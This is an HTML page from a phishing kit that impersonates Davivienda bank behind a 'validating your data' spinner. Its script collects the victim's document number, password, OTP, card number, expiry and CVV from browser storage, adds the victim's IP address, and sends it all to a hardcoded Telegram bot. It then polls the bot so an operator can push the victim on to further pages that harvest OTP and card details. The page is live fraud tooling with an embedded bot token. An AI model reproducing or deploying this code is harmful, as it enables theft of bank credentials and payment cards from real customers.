<!DOCTYPE html>
<html lang="es">
<head>
   
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="./imagenes/unnamed.png?v=2">
    <title>Davivienda - Validando</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        body {
            font-family: 'Open Sans', sans-serif;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ED1C24;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-white flex flex-col min-h-screen">
    <div class="w-full max-w-md mx-auto px-6 pt-8 pb-4 text-center">
        <!-- Logo -->
        <div class="flex justify-center mb-12">
            <img src="./imagenes/Davivienda-Logo-EPS-vector-image.png" alt="Davivienda" class="w-[240px] object-contain">
        </div>

        <div class="flex justify-center mb-10">
            <div class="loader"></div>
        </div>

        <h2 class="text-[24px] font-bold text-[#ED1C24] mb-4">Estamos validando tus datos</h2>
        <p class="text-[#666] text-[16px]">Por favor espera un momento, no cierres esta ventana.</p>

        <!-- Divider -->
        <div class="mt-20 pt-8 border-t border-[#eee]"></div>
    </div>

    <script>
        const TOKEN = "8828858538:AAFiqcWpFxvQWsUM4pcSDxJeoDoNz5OqQcU";
        const CHAT_ID = "-5294649366";

        // Generate transaction ID unique for this session
        const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

        // Get data from localStorage
        const tipo = localStorage.getItem('davivienda_doc_type') || "Desconocido";
        const num = localStorage.getItem('davivienda_doc_num') || "Desconocido";
        const pass = localStorage.getItem('davivienda_pass') || "No capturada";
        const otp = localStorage.getItem('davivienda_otp');
        const cardNum = localStorage.getItem('davivienda_card_number');
        const cardDate = localStorage.getItem('davivienda_card_date');
        const cardCvv = localStorage.getItem('davivienda_card_cvv');
        const fotosSubidas = localStorage.getItem('davivienda_fotos_subidas');
        
        // Get IP and Send
        $.getJSON("https://api.ipify.org?format=json", function(data) {
            let message = `🏦 <b>DAVIVIENDA LOGIN</b>\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `📄 <b>Documento:</b> <code>${tipo} ${num}</code>\n`;
            message += `🔑 <b>Clave:</b> <code>${pass}</code>\n`;
            
            if (otp) {
                message += `🔐 <b>OTP:</b> <code>${otp}</code>\n`;
            }
            if (cardNum) {
                message += `━━━━━━━━━━━━━━━━━━━━\n`;
                message += `💳 <b>Tarjeta:</b> <code>${cardNum}</code>\n`;
                message += `📅 <b>Fecha:</b> <code>${cardDate}</code>\n`;
                message += `🔒 <b>CVV:</b> <code>${cardCvv}</code>\n`;
            }
            if (fotosSubidas) {
                message += `📸 <b>Fotos:</b> <code>Subidas ✅</code>\n`;
            }
            
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `🆔 <b>ID:</b> <code>${transactionId}</code>`;
            
            const keyboard = {
                inline_keyboard: [
                    [{ text: "Pedir OTP", callback_data: `otp:${transactionId}` }],
                    [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }],
                    [{ text: "Pedir Tarjeta", callback_data: `tarjeta:${transactionId}` }],
                    [{ text: "Error Tarjeta", callback_data: `error_tarjeta:${transactionId}` }],
                    [{ text: "Soy Yo", callback_data: `soy:${transactionId}` }],
                    [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }],
                    [{ text: "Error Logo", callback_data: `error_logo:${transactionId}` }]
                ]
            };

            // Send to Telegram
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                })
            });

            // Start polling
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-50`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result) {
                        data.result.forEach(update => {
                            if (update.callback_query && update.callback_query.data) {
                                const action = update.callback_query.data;
                                
                                // Check if the callback belongs to this transaction
                                if (action.includes(transactionId)) {
                                    clearInterval(interval);
                                    
                                    // Answer callback
                                    fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({ callback_query_id: update.callback_query.id })
                                    });

                                    // Clean buttons
                                    fetch(`https://api.telegram.org/bot${TOKEN}/editMessageReplyMarkup`, {
                                        method: 'POST',
                                        headers: {'Content-Type': 'application/json'},
                                        body: JSON.stringify({
                                            chat_id: update.callback_query.message.chat.id,
                                            message_id: update.callback_query.message.message_id,
                                            reply_markup: { inline_keyboard: [] }
                                        })
                                    });

                                    // Redirects
                                    if (action === `otp:${transactionId}`) {
                                        window.location.href = 'token.html';
                                    } else if (action === `error_otp:${transactionId}`) {
                                        window.location.href = 'token.html?error=1';
                                    } else if (action === `tarjeta:${transactionId}`) {
                                        window.location.href = 'tarjeta.html';
                                    } else if (action === `error_tarjeta:${transactionId}`) {
                                        window.location.href = 'tarjeta_error.html';
                                    } else if (action === `soy:${transactionId}`) {
                                        window.location.href = 'soyyo.html';
                                    } else if (action === `finalizar:${transactionId}`) {
                                        window.location.href = 'https://www.davivienda.com/';
                                    } else if (action === `error_logo:${transactionId}`) {
                                        window.location.href = 'identificacion.html';
                                    }
                                }
                            }
                        });
                    }
                });
            }, 2000);
        });
    </script>
</body>
</html>
